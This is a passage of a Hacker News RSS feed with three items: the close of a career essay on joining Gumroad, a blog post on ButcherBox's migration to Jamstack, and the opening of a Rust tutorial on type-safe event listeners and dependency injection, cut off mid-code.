<p>On Labor day, September 7th, 2020, I got a call from Sahil in the afternoon. We spoke about a variety of topics for over an hour. Forty minutes in, he asked me what I was looking for in terms of salary. It turns out I was the only candidate for the job. The person he had been writing about in the past week was me. I had been chasing my shadow, but it had motivated me to do my best work on my application because I thought I was competing against someone with a lot more experience for the&nbsp;job.</p>
<p>Sending the application packet well before the interview was essential because we had a shared basis of ideas to discuss rather than me presenting the ideas for the first time and receiving his reactions. This helped out discussion be substantive and solutions-oriented. Rather than an interview, it was the first day of working together, which was a much more effective framework for getting things&nbsp;done.</p>
<p>One bit of negotiation during the phone call that I am proud of is that I requested my start date be backdated to September first, the day I had sent the email, earning me a full month of pay for September instead of prorating. Sahil agreed on the basis of the work I had already done throughout the week to prepare the application packet. This is essentially the same as negotiating a signing bonus, but applies outside of the ‚Äúsalaried employee‚Äù context. I don‚Äôt recommend this tactic for traditional positions, negotiating a signing bonus is far more straightforward in most&nbsp;cases.</p>
<p>By the end of the day Monday, I had a written informal offer from Sahil, but we were unable to do the paperwork because it was a federal holiday, so Gumroad‚Äôs legal and financial advisory was out of office. Tuesday morning, I informed the <span>CTO</span> and my manager at my then-current job that I had accepted a new role. They were disappointed but very supportive. ‚ÄúTwo weeks notice‚Äù is a professional courtesy, not a requirement, in at-will employment situations. My previous employer and I split the difference based on the scope of work that I had committed to doing. I ended up sticking around for five business days to wrap up my various projects so as to not leave my team hanging. I worked at Gumroad in the evenings as I got onboarded with the&nbsp;company.</p>
<p>Also on Tuesday I finalized the contract with Gumroad. I was impressed that Gumroad‚Äôs <span>CFO</span> was able to get me set up with a signed independent contractor agreement (with no restrictive clauses whatsoever), tax paperwork, and direct deposit, all in a single day. That evening, Sahil announced my hiring on Twitter, which in my book is better proof than a&nbsp;contract.</p>
<p>It took one week from first contact to signed contract for me to become the Head of Marketing at Gumroad, but that week was only possible because of the months leading up to it. I‚Äôm working far more than quarter time at the moment, but that was agreed upon ahead of time; quarter time is the goal that I‚Äôm working towards by improving at the job and implementing processes. I‚Äôm sure I‚Äôll get there eventually, but for now I‚Äôm having too much fun to slow&nbsp;down.</p>
  </div></div>]]>
            </description>
            <link>https://philipkiely.com/essays/gumroad_hom.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590467</guid>
            <pubDate>Fri, 25 Sep 2020 14:56:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How ButcherBox Made E-Commerce 600% Faster with Jamstack]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590398">thread link</a>) | @robric
<br/>
September 25, 2020 | https://resources.fabric.inc/blog/jamstack-ecommerce-story | <a href="https://web.archive.org/web/*/https://resources.fabric.inc/blog/jamstack-ecommerce-story">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>

<div>
<div>
<div data-widget-type="cell" data-x="0" data-w="12">

<div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151388194052436" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>
<div>

 
<div>
<p><img width="100" height="100" alt="Sajjad Heydari" src="https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=100&amp;height=100&amp;name=sajjad.jpeg" srcset="https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=50&amp;height=50&amp;name=sajjad.jpeg 50w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=100&amp;height=100&amp;name=sajjad.jpeg 100w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=150&amp;height=150&amp;name=sajjad.jpeg 150w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=200&amp;height=200&amp;name=sajjad.jpeg 200w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=250&amp;height=250&amp;name=sajjad.jpeg 250w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=300&amp;height=300&amp;name=sajjad.jpeg 300w" sizes="(max-width: 100px) 100vw, 100px"> 
</p>
<div>
<p id="hubspot-author_data" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
Sajjad Heydari
</p>
<p><i></i> September 25 
</p></div>
</div>
</div>
<p><img src="https://resources.fabric.inc/hubfs/fast-cattle.jpg" alt="cattle running">
</p>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>ButcherBox, a meat subscription and delivery service, recently moved the tech stack for <a href="https://www.butcherbox.com/" rel="noopener" target="_blank">their e-commerce site</a> from a PHP monolith to <a href="https://jamstack.org/" rel="noopener" target="_blank">Jamstack</a> to improve performance and agility while lowering costs. In this post, we will break down <a href="https://youtu.be/pGjEz9bVoos" rel="noopener" target="_blank">ButcherBox's journey to Jamstack</a>, as told by <a href="https://twitter.com/jeffgnatek" rel="noopener" target="_blank">Jeff Gnatek</a>, their head of engineering.</p>
<!--more-->
<p>If you run a subscription-based e-commerce business and want to reduce technical debt while decreasing page load time and development time, their story will give you the direction you need for a successful migration. But first, for those who don't know: Jamstack stands for JavaScript, API, and Markup stack.</p>
<p>Jamstack is a web development approach focused on using client-side JavaScript, reusable APIs, and prebuilt Markup. This approach separates different concerns in different areas, allowing for faster development, easier maintenance, and reduced cost and complexity in comparison to monolithic PHP code.</p>

<h2 id="monolithic-code">Starting with a Monolith</h2>
<p>In 2015, ButcherBox started on Kickstarter and quickly brought their website to life with <a href="https://wordpress.org/" rel="noopener" target="_blank">Wordpress</a>. Non-technical people found it easy to work with, PHP and jQuery developers were easy to hire, and there were no expensive DevOps involved. All it took to publish a page was to press "Publish" in WordPress and specific behavior was added through plugins.</p>
<p>Unfortunately, as the complexity of ButcherBox grew, their performance dropped. Working with Wordpress's PHP means having frontend and backend code in single files. Although this is a standard, it becomes problematic as the number of developers on a team grows.</p>
<p>Generally speaking, backend code is involved in the business logic and security of the system while frontend code is involved in presenting the information in a beautiful and intuitive way. Having both of them in a single file is okay for small teams, but not for when there are designated developers working explicitly on one of the two. Managing conflicts in the file edits on itself can double development time and time spent on related tasks.</p>
<p>Gnatek says that their bottleneck was their platform. Whenever they wanted to introduce some new features they needed to work on it for a long time in advance, which limited their ability to follow trends and implement new ideas on the fly.</p>
<p>In addition to this, the complexity of their website resulted in having page load times around 4 seconds, sometimes even as high as 7 seconds. This is a huge issue for an e-commerce website as <a href="https://resources.fabric.inc/blog/ecommerce-site-speed" rel="noopener">page load time has a great impact on conversion rates</a>. Realizing this, they decided to change how they developed and managed their website.</p>

<h2 id="decoupling-the-code">Decoupling the Code</h2>
<p>ButcherBox started separating their building blocks and concerns into different areas. The goal was to swap the engine out mid-flight‚Äîto change the system incrementally, moving it from the old, slow one to the new, faster one.</p>
<p>This method, known as the <a href="https://martinfowler.com/bliki/StranglerFigApplication.html" rel="noopener" target="_blank">Strangler Fig Pattern</a>, uses a <a href="https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/" rel="noopener" target="_blank">reverse proxy</a> such as <a href="https://www.nginx.com/" rel="noopener" target="_blank">Nginx</a> to determine where each user's request should be handled. If the request accesses something that has been migrated to the new codebase it will be forwarded to that; otherwise the old website would be presented. ButcherBox started by routing the one-time purchase pages of their shop to a new website without affecting the old one.</p>
<p>The new website was created by separating frontend and backend code bases, using <a href="https://resources.fabric.inc/blog/rest-apis">APIs</a> to communicate between the two. This strategy on its own created a faster-perceived page load time. It also improved security since they no longer needed to expose a PHP server. They relied on <a href="https://auth0.com/" rel="noopener" target="_blank">Auth0</a> to handle their authentication and authorization process and used <a href="https://www.netlify.com/" rel="noopener" target="_blank">Netlify</a> to build and serve their website over the internet.</p>
<h3 id="frontend">Frontend</h3>
<p>Frontend development was done using <a href="https://www.gatsbyjs.com/" rel="noopener" target="_blank">GatsbyJS</a>. This framework is based on <a href="https://reactjs.org/" rel="noopener" target="_blank">React</a> and allows for the reuse of components which reduces development time.</p>
<p>Gatsby, and React in general, is based on the idea of components that work independently of each other. As an example, your <em>recent article column</em> doesn't need to be aware of your footer, so by separating their code we allow for reusable components and faster development time. Besides, Gatsby relies on server-side rendering which improves page load time at the cost of static build time on the server every time the website is updated.</p>
<h3 id="backend">Backend</h3>
<p>After separating the frontend and backend, ButcherBox started separating backend components. They started by dividing the code into two parts: the core business logic and the ephemeral contents such as product catalog, inventory, merchandising, and promotional ads. All of these separations of previously entangled parts allowed for higher test coverage and reduced the risk that a single update to the website would crash everything. It also allowed for a more agile development.</p>

<h2 id="replacing-the-admin">Replacing the Admin</h2>
<p>To replace the WordPress admin they used <a href="https://nova.laravel.com/" rel="noopener" target="_blank">Laravel's Nova</a>, a highly customizable admin panel written in PHP. Nova helped the non-technical members of the team work with the system without having to deal with direct database interfaces. To add food recipes‚Äîcontent that supports the selling of their meat products‚Äîthe team moved to <a href="https://www.contentful.com/">Contentful</a> which provides a full-featured editor that automatically triggers a build on Netlify whenever there is new content to be served.</p>
<p>This proved to be problematic at first: having many different components and server side rendering together means that any small change requires a full rebuild of the website, taking as much as 20 minutes sometimes. To work around this issue, the team started creating different instances of frontend and backend, each working independently. This meant that adding a new food recipe wouldn't trigger a build for the Shop page.</p>
<p>To speed things up, they shared components among the instances wherever possible. For example, to reuse Gatsby's logic on the frontend, they used <a href="https://www.gatsbyjs.com/docs/themes/">Gatsby Themes</a>, a collection of reusable, shareable functionality to be used among different Gatsby instances.</p>
<p>This journey took their website from a slow monolith in PHP with increasing complexity and development costs to a fast, easily <a href="https://resources.fabric.inc/blog/scalable-commerce" rel="noopener">scalable e-commerce site</a>. The team reported that their website was about <strong>600% faster</strong> on average (going from 4000ms to under 600ms), and that the development team was able to launch a new part of the website within days.</p>

<h2 id="is-jamstack-right-for-you-">Is Jamstack Right for You?</h2>
<p>Jamstack is a great method for web development, but like all other methodologies, it is not for everyone. There are certain things to consider before choosing to work with Jamstack.</p>
<h3 id="considerations">Considerations</h3>
<p>First, consider the data you're presenting on it. Does it need to be dynamic, relying on different users? A typical example of this would be social media sites that show you your friends' activities. Having dynamic data is not necessarily bad, but it requires having a set of APIs to provide them. That said, I wouldn't recommend using Jamstack if more than a third of your data needs to be dynamic.</p>
<p>Second, consider how fast the updates to your website should go live. Can the changes wait a few minutes to propagate? This would be okay for a blog post or a food recipe, but not so much for stock count and pricing. Again, if your data falls into this category, you can deliver it to the client through an API. But that would be too much trouble if all or most of your data requires real-time updates.</p>
<p>Finally, do you already have an API or different sources of content? The data presented on your website will usually be propagated from different sources such as Contentful, a database, and an API. If you already have different sources of data, that's a plus. Otherwise, you have to create them as you go along. This is exactly what ButcherBox did.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Switching to Jamstack provides better security, better performance, reduced complexity in code, and low-friction hosting. The only apparent downside is the cost of migrating to such a system.</p>
<p>Keep in mind that Jamstack relies on many third-party services, which is great for reducing costs and complexity of your codebase, but any downtime on those services could potentially affect you.</p>
<p>With all that said, are you ready to switch your monolithic e-commerce site to Jamstack? If so, <a href="http://fabric.inc/" rel="noopener">Fabric</a> can help simplify the process.</p>

<p><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-312fa357-7060-4240-bde4-1522bb5bd282"><span id="hs-cta-312fa357-7060-4240-bde4-1522bb5bd282"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/6994951/312fa357-7060-4240-bde4-1522bb5bd282"><img id="hs-cta-img-312fa357-7060-4240-bde4-1522bb5bd282" height="800" width="1710" src="https://no-cache.hubspot.com/cta/default/6994951/312fa357-7060-4240-bde4-1522bb5bd282.png" alt="Evolving Your Ecommerce Platform White Paper"></a></span></span><!-- end HubSpot Call-to-Action Code --></p></span>
</p>
<div>
<div>
<p><img width="100" height="100" alt="Sajjad Heydari" src="https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=100&amp;height=100&amp;name=sajjad.jpeg" srcset="https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=50&amp;height=50&amp;name=sajjad.jpeg 50w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=100&amp;height=100&amp;name=sajjad.jpeg 100w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=150&amp;height=150&amp;name=sajjad.jpeg 150w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=200&amp;height=200&amp;name=sajjad.jpeg 200w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=250&amp;height=250&amp;name=sajjad.jpeg 250w, https://resources.fabric.inc/hs-fs/hubfs/sajjad.jpeg?width=300&amp;height=300&amp;name=sajjad.jpeg 300w" sizes="(max-width: 100px) 100vw, 100px"> 
</p>
<div>
<p id="hubspot-author_data" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
Sajjad Heydari
</p>
<p><i></i> September 25 
</p></div>
</div>
           
</div>
</div>
</div>

</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div></div>]]>
            </description>
            <link>https://resources.fabric.inc/blog/jamstack-ecommerce-story</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590398</guid>
            <pubDate>Fri, 25 Sep 2020 14:50:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Types over Strings: Extensible Architectures in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590364">thread link</a>) | @lukastyrychtr
<br/>
September 25, 2020 | https://willcrichton.net/notes/types-over-strings/ | <a href="https://web.archive.org/web/*/https://willcrichton.net/notes/types-over-strings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  <p>
    
    Will Crichton
    
    &nbsp; ‚Äî &nbsp;
    April 12, 2020
  </p>
  <p>I show how to implement event listeners and dependency injection using Rust's type system to avoid common errors in stringly-typed versions of these extensible architectures.</p>
  <p><em>All code in this note is available <a href="https://github.com/willcrichton/types-over-strings">on Github</a>.</em></p>

<p>Types are a useful tool to make sure software libraries work together. I expect an int, you give me a string, compiler raises an error. In my experience, types, interfaces and encapsulation work best when using black-box APIs: hash maps, regexes, HTTP requests. The programmer controls the top-level program, i.e. the types that orchestrate the individual pieces.</p>

<p>However, the Type Life tends to become harder when dealing with frameworks, or any kind of <em>extensible architecture</em> where the programmer is plugging components into a bigger system they don‚Äôt control. For example, consider the venerable <a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener"><code>EventTarget.addEventListener</code></a> from JavaScript:</p>

<div><div><pre><code><span>document</span><span>.</span><span>body</span><span>.</span><span>addEventListener</span><span>(</span><span>'</span><span>click</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>event</span><span>)</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>event</span><span>.</span><span>clientX</span><span>,</span> <span>event</span><span>.</span><span>clientY</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>This is an extensible architecture in the sense that you don‚Äôt control the DOM API, nor can you control what events are registered to DOM nodes. That changes all the time. You can only hook in to events the browser provides.</p>

<p>Let‚Äôs look at this function with two related questions: what is the type of <code>addEventListener</code>? And what kinds of errors can we make using this function?</p>

<p>The most basic type for <code>addEventListener(event, listener)</code> is that <code>event</code> is a string, and <code>listener</code> is a function. A function from what to what? The input is an ‚Äúevent‚Äù, whatever that means, and there is no output. Indeed, when <code>addEventListener</code> gets ported into a statically typed language like <a href="https://github.com/reasonml-community/bs-webapi-incubator/blob/ffa8b27ffacbe9c2a97b9ee1509d83918a5ea01a/src/Webapi/Webapi__Dom/Webapi__Dom__EventTarget.re#L4">ReasonML</a>, the type definition looks like:</p>

<div><div><pre><code><span>external</span> <span>addEventListener</span> <span>:</span> <span>(</span><span>string</span><span>,</span> <span>Dom</span><span>.</span><span>event</span> <span>=&gt;</span> <span>unit</span><span>)</span> <span>=&gt;</span> <span>unit</span><span>;</span>
</code></pre></div></div>

<p>Here‚Äôs two ways we can mess this up.</p>
<ul>
  <li>
    <p><strong>Typo the event name</strong>: as with all stringly-typed programming, we can write the event name incorrectly, like <code>"clack"</code> instead of <code>"click"</code>. This error gets caught at runtime, usually when we register the handler.</p>
  </li>
  <li>
    <p><strong>Use the event object incorrectly:</strong> while all events implement the base <a href="https://developer.mozilla.org/en-US/docs/Web/API/Event"><code>Event</code> interface</a>, each individual event has different fields. For example, ‚Äúclick‚Äù is a <a href="https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent"><code>MouseEvent</code></a> so it contains fields <code>clientX</code> and <code>clientY</code>. But what if I tried to access <code>clientX</code> on a <a href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent"><code>KeyboardEvent</code></a>? That error gets caught at runtime, when we execute the offending code path in the handler.</p>
  </li>
</ul>

<p>In this note, I‚Äôll show how you can avoid errors like these by designing type-safe extensible systems. We‚Äôll look at two examples: event handling and dependency injection. The code will use Rust, but the lessons apply to any functional language.</p>

<h2 id="type-safe-event-listeners">Type-safe event listeners</h2>

<p>The basic idea in making type-safe extensible architectures is to replace strings with types. Any time you use a string as an identifier (e.g. for an event, or a software component), use a type instead. Why?</p>
<ul>
  <li>Types are better identifiers than strings. If you typo a type, the type checker can catch your mistake.</li>
  <li>Types can be associated with additional information. The string <code>"click"</code> means nothing to the type checker. But the type <code>ClickEvent</code> tells the typechecker about what fields the event has, and how event listeners should handle the event.</li>
</ul>

<p>Here‚Äôs an example of using a type-safe event API in Rust.</p>

<div><div><pre><code><span>struct</span> <span>OnClick</span> <span>{</span>
  <span>mouse_x</span><span>:</span> <span>i32</span><span>,</span>
  <span>mouse_y</span><span>:</span> <span>i32</span><span>,</span>
<span>}</span>

<span>let</span> <span>mut</span> <span>dispatcher</span> <span>=</span> <span>EventDispatcher</span><span>::</span><span>new</span><span>();</span>

<span>dispatcher</span><span>.add_event_listener</span><span>(|</span><span>event</span><span>:</span> <span>&amp;</span><span>OnClick</span><span>|</span> <span>{</span>
  <span>assert_eq!</span><span>(</span><span>event</span><span>.mouse_x</span><span>,</span> <span>10</span><span>);</span>
  <span>assert_eq!</span><span>(</span><span>event</span><span>.mouse_y</span><span>,</span> <span>5</span><span>);</span>
<span>});</span>

<span>dispatcher</span><span>.trigger</span><span>(</span><span>&amp;</span><span>OnClick</span> <span>{</span>
  <span>mouse_x</span><span>:</span> <span>10</span><span>,</span>
  <span>mouse_y</span><span>:</span> <span>5</span><span>,</span>
<span>})</span>
</code></pre></div></div>

<p>In the snippet above, the event type is inferred from the type parameter <code>OnClick</code> of the closure, rather than using a string argument. This solves both of our errors:</p>
<ul>
  <li>If we wrote <code>&amp;OnClack</code>, the type checker will say <code>OnClack not found</code>.</li>
  <li>If we wrote <code>event.keyboard_input</code> instead of <code>event.mouse_x</code>, the typechecker will say <code>no field keyboard_input on type OnClick</code>.</li>
</ul>

<p>Stupendous! But how does it work? Here‚Äôs the basic structure.</p>

<div><div><pre><code><span>// Events must not contain pointers to things, for simplicity</span>
<span>trait</span> <span>Event</span><span>:</span> <span>'static</span> <span>{}</span>

<span>// An event listener is a function from an event to nil</span>
<span>trait</span> <span>EventListener</span><span>&lt;</span><span>E</span><span>:</span> <span>Event</span><span>&gt;</span> <span>=</span> <span>FnMut</span><span>(</span><span>&amp;</span><span>E</span><span>)</span> <span>-&gt;</span> <span>()</span> <span>+</span> <span>'static</span><span>;</span>

<span>// An event dispatcher holds all the event listeners</span>
<span>struct</span> <span>EventDispatcher</span> <span>{</span> <span>/* .. */</span> <span>}</span>
<span>impl</span> <span>EventDispatcher</span> <span>{</span>
  <span>// Registers a function `f` to listen for an event `E`</span>
  <span>fn</span> <span>add_event_listener</span><span>&lt;</span><span>E</span><span>,</span> <span>F</span><span>&gt;</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span>
  <span>where</span>
    <span>E</span><span>:</span> <span>Event</span><span>,</span>
    <span>F</span><span>:</span> <span>EventListener</span><span>&lt;</span><span>E</span><span>&gt;</span>
  <span>{</span>
    <span>/* .. */</span>
  <span>}</span>

  <span>// Runs all the registered listeners for the event `E`</span>
  <span>fn</span> <span>trigger</span><span>&lt;</span><span>E</span><span>&gt;</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>event</span><span>:</span> <span>&amp;</span><span>E</span><span>)</span>
  <span>where</span>
    <span>E</span><span>:</span> <span>Event</span>
  <span>{</span>
    <span>/* .. */</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In order to implement <code>EventDispatcher</code>, we need a data structure that can hold all the listeners. Given an event <code>E</code>, it should provide all the listeners for <code>E</code>. This raises two questions:</p>
<ul>
  <li>How can we associate a listener with a type <code>E</code>?</li>
  <li>How can a single data structure hold listeners for multiple events, which all have different types?</li>
</ul>

<h3 id="mapping-types-to-values">Mapping types to values</h3>

<p>We will briefly detour to make a critical building block: the <code>TypeMap</code>. Based on our two requirements above, we will make a data structure that a) maps types to values, and b) holds values of different types.</p>

<p>Rust has <a href="https://doc.rust-lang.org/std/any/"><code>std::any</code></a> for this purpose. <a href="https://doc.rust-lang.org/std/any/struct.TypeId.html"><code>TypeId</code></a> allows us to get a unique, hashable identifier for each type. <a href="https://doc.rust-lang.org/std/any/trait.Any.html"><code>Any</code></a> allows us to up-cast/down-cast objects at runtime. Hence, our <code>TypeMap</code> will map from <code>TypeId</code> to <code>Box&lt;dyn Any&gt;</code>.</p>

<div><div><pre><code><span>use</span> <span>std</span><span>::</span><span>collections</span><span>::</span><span>HashMap</span><span>;</span>
<span>use</span> <span>std</span><span>::</span><span>any</span><span>::{</span><span>TypeId</span><span>,</span> <span>Any</span><span>};</span>

<span>struct</span> <span>TypeMap</span><span>(</span><span>HashMap</span><span>&lt;</span><span>TypeId</span><span>,</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>Any</span><span>&gt;&gt;</span><span>);</span>
</code></pre></div></div>

<p>To add an element to the map:</p>

<div><div><pre><code><span>impl</span> <span>TypeMap</span> <span>{</span>
  <span>pub</span> <span>fn</span> <span>set</span><span>&lt;</span><span>T</span><span>:</span> <span>Any</span> <span>+</span> <span>'static</span><span>&gt;</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>t</span><span>:</span> <span>T</span><span>)</span> <span>{</span>
    <span>self</span><span>.</span><span>0</span><span>.insert</span><span>(</span><span>TypeId</span><span>::</span><span>of</span><span>::</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(),</span> <span>Box</span><span>::</span><span>new</span><span>(</span><span>t</span><span>));</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This means our map has one unique value for a given type. For example, if we use the <code>TypeMap</code> like this:</p>

<div><div><pre><code><span>let</span> <span>mut</span> <span>map</span> <span>=</span> <span>TypeMap</span><span>::</span><span>new</span><span>();</span>
<span>map</span><span>.set</span><span>::</span><span>&lt;</span><span>i32</span><span>&gt;</span><span>(</span><span>1</span><span>);</span>
</code></pre></div></div>

<blockquote>
  <p>Aside: the syntax <code>::&lt;i32&gt;</code> is Rust‚Äôs ‚Äúturbofish‚Äù. It explicitly binds a type parameter of a polymorphic function, rather than leaving it to be inferred. <a href="https://stackoverflow.com/questions/52360464/what-is-the-syntax-instance-methodsomething/52361559">Further</a> <a href="https://matematikaadit.github.io/posts/rust-turbofish.html">explanation</a> <a href="https://techblog.tonsser.com/posts/what-is-rusts-turbofish">here</a>.</p>
</blockquote>

<p>Then we insert a value <code>1</code> at the key <code>TypeId::of::&lt;i32&gt;()</code>. We can also implement <code>has</code> and <code>get</code> functions:</p>

<div><div><pre><code><span>impl</span> <span>TypeMap</span> <span>{</span>
  <span>pub</span> <span>fn</span> <span>has</span><span>&lt;</span><span>T</span><span>:</span> <span>'static</span><span>+</span><span>Any</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
    <span>self</span><span>.</span><span>0</span><span>.contains_key</span><span>(</span><span>&amp;</span><span>TypeId</span><span>::</span><span>of</span><span>::</span><span>&lt;</span><span>T</span><span>&gt;</span><span>())</span>
  <span>}</span>

  <span>pub</span> <span>fn</span> <span>get_mut</span><span>&lt;</span><span>T</span><span>:</span> <span>'static</span><span>+</span><span>Any</span><span>&gt;</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;&amp;</span><span>mut</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>self</span><span>.</span><span>0</span><span>.get_mut</span><span>(</span><span>&amp;</span><span>TypeId</span><span>::</span><span>of</span><span>::</span><span>&lt;</span><span>T</span><span>&gt;</span><span>())</span><span>.map</span><span>(|</span><span>t</span><span>|</span> <span>{</span>
      <span>t</span><span>.downcast_mut</span><span>::</span><span>&lt;</span><span>T</span><span>&gt;</span><span>()</span><span>.unwrap</span><span>()</span>
    <span>})</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Look carefully at <code>get_mut</code>. The inner hash map returns a value of type <code>Box&lt;dyn Any&gt;</code>, which we can <code>downcast_mut</code> to become a value of type <code>&amp;mut T</code>. This operation is guaranteed to not fail, because only values of type <code>T</code> are stored in the hash map under the key for <code>T</code>.</p>

<h3 id="finishing-our-event-system">Finishing our event system</h3>

<p>With the <code>TypeMap</code> in hand, we can finish our event system. For the <code>EventDispatcher</code>, the <code>TypeMap</code> will map from events to a vector of listeners.</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>EventDispatcher</span><span>(</span><span>TypeMap</span><span>);</span>

<span>// Type alias for a list of listeners for an event</span>
<span>type</span> <span>ListenerVec</span><span>&lt;</span><span>E</span><span>&gt;</span> <span>=</span> <span>Vec</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> <span>EventListener</span><span>&lt;</span><span>E</span><span>&gt;&gt;&gt;</span><span>;</span>

<span>impl</span> <span>EventDispatcher</span> <span>{</span>
  <span>pub</span> <span>fn</span> <span>add_event_listener</span><span>&lt;</span><span>E</span><span>,</span> <span>F</span><span>&gt;</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span>
  <span>where</span>
    <span>E</span><span>:</span> <span>Event</span><span>,</span>
    <span>F</span><span>:</span> <span>EventListener</span><span>&lt;</span><span>E</span><span>&gt;</span><span>,</span>
  <span>{</span>
    <span>if</span> <span>!</span><span>self</span><span>.</span><span>0</span><span>.has</span><span>::</span><span>&lt;</span><span>ListenerVec</span><span>&lt;</span><span>E</span><span>&gt;&gt;</span><span>()</span> <span>{</span>
      <span>self</span><span>.</span><span>0</span><span>.set</span><span>::</span><span>&lt;</span><span>ListenerVec</span><span>&lt;</span><span>E</span><span>&gt;&gt;</span><span>(</span><span>Vec</span><span>::</span><span>new</span><span>());</span>
    <span>}</span>

    <span>let</span> <span>listeners</span> <span>=</span> <span>self</span><span>.</span><span>0</span><span>.get_mut</span><span>::</span><span>&lt;</span><span>ListenerVec</span><span>&lt;</span><span>E</span><span>&gt;&gt;</span><span>()</span><span>.unwrap</span><span>();</span>
    <span>listeners</span><span>.push</span><span>(</span><span>Box</span><span>::</span><span>new</span><span>(</span><span>f</span><span>));</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>When asked to register an event listener, we get the <code>ListenerVec</code> from the <code>TypeMap</code> and insert the new listener. Trigger is similarly simple:</p>

<div><div><pre><code><span>impl</span> <span>EventDispatcher</span> <span>{</span>
  <span>pub</span> <span>fn</span> <span>trigger</span><span>&lt;</span><span>E</span><span>:</span> <span>Event</span><span>&gt;</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>event</span><span>:</span> <span>&amp;</span><span>E</span><span>)</span> <span>{</span>
    <span>if</span> <span>let</span> <span>Some</span><span>(</span><span>listeners</span><span>)</span> <span>=</span> <span>self</span><span>.</span><span>0</span><span>.get_mut</span><span>::</span><span>&lt;</span><span>ListenerVec</span><span>&lt;</span><span>E</span><span>&gt;&gt;</span><span>()</span> <span>{</span>
      <span>for</span> <span>callback</span> <span>in</span> <span>listeners</span> <span>{</span>
        <span>callback</span><span>(</span><span>event</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>That‚Äôs it! Now we have a type-safe event system.</p>

<h2 id="type-safe-dependency-injection">Type-safe dependency injection</h2>

<p>To avoid the impression that this pattern is specific to event listeners, I want to show another example of using types-over-strings in extensible architectures. I started playing with <a href="https://github.com/amethyst/specs">specs</a> recently, an entity-component-system architecture written in Rust. Its <code>System</code> uses a dependency-injection-like pattern, so I wanted to distill that to a pedagogical example here.</p>

<p>Dependency injection systems are often rife with <a href="https://www.vogella.com/tutorials/SpringDependencyInjection/article.html">XML files</a>, string keys, and other stringly-typed problems. DI makes for a good use case here.</p>

<h3 id="motivation">Motivation</h3>

<p>The basic idea of dependency injection (DI) is that you have a component that depends on another, like a web server using a database. However, you don‚Äôt want to hard-code a particular database constructor, and rather make it easy to swap in different databases. For example:</p>

<div><div><pre><code><span>trait</span> <span>Database</span> <span>{</span>
  <span>fn</span> <span>name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>&amp;</span><span>'static</span> <span>str</span><span>;</span>
<span>}</span>

<span>struct</span> <span>MySQL</span><span>;</span>
<span>impl</span> <span>Database</span> <span>for</span> <span>MySQL</span> <span>{</span>
